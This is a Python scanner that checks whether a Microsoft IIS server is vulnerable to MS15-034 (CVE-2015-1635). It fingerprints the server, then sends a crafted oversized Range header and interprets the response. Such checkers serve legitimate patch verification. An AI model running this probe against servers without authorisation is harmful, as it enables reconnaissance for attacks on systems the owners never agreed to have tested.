import socket
import sys
import time

def print_banner():
    """Print the banner with CVE reference."""
    banner = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗███████╗       ██╗ ██████╗ ██████╗ ███████╗    
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║██╔════╝      ███║██╔════╝ ╚════██╗██╔════╝    
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║███████╗█████╗╚██║███████╗  █████╔╝███████╗    
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║╚════██║╚════╝ ██║██╔═══██╗ ╚═══██╗╚════██║    
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║███████║       ██║╚██████╔╝██████╔╝███████║    
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝╚══════╝       ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝        
"""
    print(banner)

def connect_to_server(ip, port):
    """Create a TCP connection to the specified IP and port."""
    try:
        print(f"[DEBUG] Connecting to {ip}:{port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        print("[DEBUG] Connection established.")
        return sock
    except socket.error as e:
        print(f"[ERROR] Could not create or connect socket. {e}")
        sys.exit(1)

def send_http_request(sock, request):
    """Send an HTTP request to the connected socket and return the response."""
    try:
        print("[DEBUG] Sending HTTP request...")
        sock.sendall(request.encode())
        response = sock.recv(1024).decode()
        print("[DEBUG] Response received.")
        return response
    except socket.error as e:
        print(f"[ERROR] Could not send or receive data. {e}")
        return None
    finally:
        sock.close()

def check_vulnerability(ip, port):
    """Check if the server at the given IP and port is vulnerable to MS15-034."""
    print(f"[*] Starting vulnerability check on {ip}:{port}...\n")

    initial_request = "GET / HTTP/1.0\r\n\r\n"
    exploit_request = "GET / HTTP/1.1\r\nHost: test\r\nRange: bytes=0-18446744073709551615\r\n\r\n"

    # Step 1: Check if the server is running Microsoft IIS
    sock = connect_to_server(ip, port)
    response = send_http_request(sock, initial_request)

    if response:
        if "Microsoft" in response:
            print("[INFO] The server is running Microsoft IIS.")
            print("[INFO] Proceeding to check for MS15-034 vulnerability...")
        else:
            print("[INFO] The server is NOT running IIS, identified by the absence of 'Microsoft' in the server's response headers.")
            return
    else:
        print("[ERROR] No response received from the server.")
        return

    # Step 2: Check for MS15-034 vulnerability
    sock = connect_to_server(ip, port)
    response = send_http_request(sock, exploit_request)

    if response:
        if "Requested Range Not Satisfiable" in response:
            print("\033[91m[ALERT] The server is VULNERABLE to CVE-2015-1635.\033[0m")
            print("[DETAIL] The server responded with 'Requested Range Not Satisfiable', which indicates that the server processed the malicious Range header, a characteristic of the MS15-034 vulnerability.")
        elif "The request has an invalid header name" in response:
            print("[INFO] The server is PATCHED against MS15-034.")
            print("[DETAIL] The server responded with 'The request has an invalid header name', which suggests that it correctly rejected the malformed Range header, indicating that it is patched.")
        else:
            print("[INFO] Unexpected response, unable to determine patch status.")
            print(f"[DETAIL] The server responded with: {response.strip()}")
    else:
        print("[ERROR] No response received from the server during the vulnerability check.")

def main():
    print_banner()
    if len(sys.argv) != 2:
        print(f"[USAGE] {sys.argv[0]} <IP:Port of server>")
        sys.exit(1)

    try:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    except ValueError:
        print(f"[ERROR] Invalid IP:Port format. Use: <IP>:<Port>")
        sys.exit(1)

    start_time = time.time()
    check_vulnerability(ip, port)
    end_time = time.time()

    print(f"\n[INFO] Scan completed in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    main()
